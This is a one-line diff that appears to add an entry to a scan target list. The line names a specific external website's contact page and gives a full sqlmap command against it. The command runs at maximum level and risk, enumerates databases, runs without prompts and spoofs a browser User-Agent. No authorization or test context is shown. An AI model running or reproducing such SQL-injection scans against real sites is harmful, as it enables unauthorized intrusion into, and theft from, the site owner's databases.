@@ -1,0 +1,1 @@
+https://www.infinitycapital.bh/contact?cb=1&q=test (GET)  # /usr/bin/sqlmap -u https://www.infinitycapital.bh/contact?cb=1&q=test --batch --level=5 --risk=3 --dbs --threads=4 -H "Accept-Encoding: identity" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36" --output-dir=tool_outputs/sm_contact_q -v 2
